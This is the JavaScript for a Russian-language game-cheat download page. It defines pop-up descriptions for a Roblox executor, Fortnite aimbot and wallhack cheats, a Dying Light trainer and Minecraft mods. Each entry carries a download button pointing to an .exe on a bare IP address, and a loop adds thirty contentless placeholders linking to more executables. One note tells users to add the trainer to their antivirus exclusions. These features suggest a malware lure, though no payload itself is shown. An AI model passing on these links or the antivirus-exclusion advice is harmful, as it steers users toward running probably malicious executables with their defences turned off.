function showSection(sectionId) {
    // Скрываем все секции
    document.querySelectorAll('.section').forEach(section => {
        section.classList.remove('active');
    });
    
    // Показываем выбранную секцию
    document.getElementById(sectionId).classList.add('active');
    
    // Обновляем активные кнопки навигации
    document.querySelectorAll('.nav-btn').forEach(btn => {
        btn.classList.remove('active');
    });
    event.target.classList.add('active');
}

// Полные описания программ
const descriptions = {
    'xeno-desc': `
        <img src="1.jpg" alt="Xeno Executor" class="modal-image">
        <h2>Xeno Executor</h2>
        <p><strong>Описание:</strong> Мощный инструмент для создания и запуска скриптов в Roblox. Поддерживает Lua скрипты и предоставляет расширенные возможности для модификации игрового процесса.</p>
        <p><strong>Возможности:</strong></p>
        <ul>
            <li>Запуск пользовательских скриптов</li>
            <li>Встроенная библиотека функций</li>
            <li>Поддержка Lua 5.1</li>
            <li>Безопасное исполнение</li>
            <li>Авто-обновления</li>
            <li>Поддержка всех версий Roblox</li>
        </ul>
        <p><strong>Системные требования:</strong> Windows 10/11, .NET Framework 4.8, 2GB RAM</p>
        <a href="http://194.79.46.110:1080/mrx/xeno.exe" class="download-btn modal-download-btn">СКАЧАТЬ</a>
    `,
    'fortnite-desc': `
        <img src="2.jpg" alt="Fortnite Hack" class="modal-image">
        <h2>Fortnite Hack</h2>
        <p><strong>Описание:</strong> Комплекс читов для Fortnite включающий AIM, ESP и другие полезные функции для улучшения игрового опыта.</p>
        <p><strong>Возможности:</strong></p>
        <ul>
            <li>AIM Bot с настройкой</li>
            <li>Wallhack (ESP)</li>
            <li>No Recoil</li>
            <li>Speed Hack</li>
        </ul>
        <a href="http://194.79.46.110:1080/mrx/fortnite.exe" class="download-btn modal-download-btn">СКАЧАТЬ</a>
    `,
    'gtav-desc': `
        <img src="dying-light-the-beast.jpg" alt="Dying Light: The Beast" class="modal-image">
<h2>Dying Light: The Beast</h2>
<p><strong>Описание:</strong> Полнофункциональный трейнер для Dying Light: The Beast с множеством опций для изменения игрового процесса.</p>

<p><strong>Функции трейнера:</strong></p>
<ul>
    <li><strong>Home</strong> - Активировать трейнер</li>
    <li><strong>Numpad 0</strong> – бесконечное здоровье</li>
    <li><strong>Numpad 1</strong> – бесконечная выносливость</li>
    <li><strong>Numpad 2</strong> – моментальный режим зверя</li>
    <li><strong>Numpad 3</strong> – бесконечный режим зверя</li>
    <li><strong>Disable Beast Mode view</strong> – отключить отображение режима зверя</li>
    <li><strong>Numpad 4</strong> – бесконечные предметы / броски</li>
    <li><strong>Numpad 5</strong> – бесконечные стрелы</li>
    <li><strong>Numpad 6</strong> – установить 99 отмычек</li>
    <li><strong>Numpad 7</strong> – установить старые деньги</li>
    <li><strong>Numpad 8</strong> – супер бег</li>
    <li><strong>Numpad 9</strong> – супер прыжок</li>
    <li><strong>Enable Focus Mode</strong> – включить режим фокуса</li>
    <li><strong>Page Up</strong> – заморозить текущее время</li>
    <li><strong>Page Down</strong> – ускорить время вперёд</li>
    <li><strong>Delete</strong> – скрытность / невидимость</li>
    <li><strong>End</strong> – бесконечная прочность оружия</li>
    <li><strong>Insert</strong> – телепорт к точке пути</li>
    <li><strong>Numric 7</strong> – бесконечные прыжки</li>
    <li><strong>Numric 8</strong> – сохранить локацию</li>
    <li><strong>Numric 9</strong> – телепорт</li>
    <li><strong>Numic O</strong> – отменить телепортацию</li>
    <li><strong>Adjust Sprint Speed</strong> – регулировка скорости бега</li>
    <li><strong>Adjust Jump Height</strong> – регулировка высоты прыжка</li>
    <li><strong>Adjust Game Speed</strong> – регулировка скорости игры</li>
    <li><strong>Ctrl + X</strong> – мега опыт</li>
    <li><strong>Ctrl + T</strong> – разблокировать очки зверя</li>
    <li><strong>Ctrl + H</strong> – супер точность</li>
    <li><strong>Ctrl + N</strong> – отсутствие отдачи</li>
    <li><strong>Ctrl + Y</strong> - Бесконечная прочность транспорта</li>
</ul>

<p><strong>Инструкция по применению:</strong></p>
<ol>
    <li>Скопировать все файлы из архива в корень установленной игры.</li>
    <li>Запустить сначала трейнер, потом игру.</li>
    <li>Во время игры нажимайте на клавиши указанные в трейнере.</li>
</ol>

<p><strong>Примечание:</strong></p>
<ul>
    <li>Для корректной работы трейнера убедитесь, что у вас установлена соответствующая версия и издание игры.</li>
    <li>Антивирусное ПО может реагировать на трейнер как на угрозу из-за модификации игрового кода. Добавьте трейнер в исключения антивируса, чтобы избежать проблем с его работой.</li>
    <li>Используйте трейнеры только в одиночном режиме игры, использование в сетевой игре может привести к блокировке аккаунта.</li>
</ul>

<a href="http://194.79.46.110:1080/mrx/dying-light.exe" class="download-btn modal-download-btn">СКАЧАТЬ</a>
        <a href="http://194.79.46.110:1080/mrx/gtav.exe" class="download-btn modal-download-btn">СКАЧАТЬ</a>
    `,
    'minecraft-desc': `
        <img src="4.jpg" alt="Minecraft Mod" class="modal-image">
        <h2>Minecraft Mod</h2>
        <p><strong>Описание:</strong> Коллекция модов для Minecraft добавляющая новые возможности и улучшающая игровой процесс.</p>
        <p><strong>Возможности:</strong></p>
        <ul>
            <li>Новые блоки и предметы</li>
            <li>Улучшенная графика</li>
            <li>Оптимизация производительности</li>
            <li>Моды для выживания</li>
        </ul>
        <a href="http://194.79.46.110:1080/mrx/minecraft.exe" class="download-btn modal-download-btn">СКАЧАТЬ</a>
    `
};

// Для остальных карточек добавим заглушки
for (let i = 1; i <= 30; i++) {
    const descId = `desc-${i}`;
    if (!descriptions[descId]) {
        descriptions[descId] = `
            <img src="${(i % 4) + 1}.jpg" alt="Программа ${i}" class="modal-image">
            <h2>Программа ${i}</h2>
            <p><strong>Описание:</strong> Подробное описание скоро будет добавлено.</p>
            <p>Мы работаем над наполнением контента для этого раздела.</p>
            <a href="http://194.79.46.110:1080/mrx/file${i}.exe" class="download-btn modal-download-btn">СКАЧАТЬ</a>
        `;
    }
}

function showDescription(descId) {
    document.getElementById('modal-body').innerHTML = descriptions[descId] || descriptions['desc-1'];
    document.getElementById('description-modal').style.display = 'block';
}

function closeDescription() {
    document.getElementById('description-modal').style.display = 'none';
}

window.onclick = function(event) {
    const modal = document.getElementById('description-modal');
    if (event.target == modal) {
        closeDescription();
    }
}

// Инициализация
document.addEventListener('DOMContentLoaded', function() {
    showSection('cheats');
});
